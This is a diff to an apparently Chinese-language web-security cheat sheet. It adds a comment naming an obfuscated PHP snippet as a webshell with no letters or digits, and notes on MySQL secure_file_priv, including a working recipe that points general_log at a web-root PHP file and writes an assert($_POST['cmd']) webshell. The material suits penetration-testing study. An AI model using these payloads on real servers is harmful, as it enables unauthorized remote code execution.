@@ -119,6 +119,7 @@ ob_end_flush();
 ?>
 
 <?=
+// 沒有英數字的webshell
 $💩 = '[[[[@@' ^ '("(/%-';
 $💩(('@@['^'#!/')." /????");
 
@@ -721,8 +722,21 @@ pop graphic-context
         - `SELECT file_priv FROM mysql.user`
     - secure-file-priv
         - 限制MySQL導入導出
+            - load_file, into outfile等
+        - 運行時無法更改
+        - MySQL 5.5.53前，該變數預設為空(可以導入導出)
         - e.g. `secure_file_priv=E:\`
             - 限制導入導出只能在E:\下
+        - e.g. `secure_file_priv=null`
+            - 限制不允許導入導出    
+        - secure-file-priv限制下用general_log拿shell
+        ```
+        SET global general_log='on';
+
+        SET global general_log_file='C:/phpStudy/WWW/cmd.php';
+
+        SELECT '<?php assert($_POST["cmd"]);?>';
+        ```
 - IF語句
     - IF(condition,true-part,false-part)
     - `SELECT IF (1=1,'true','false')`
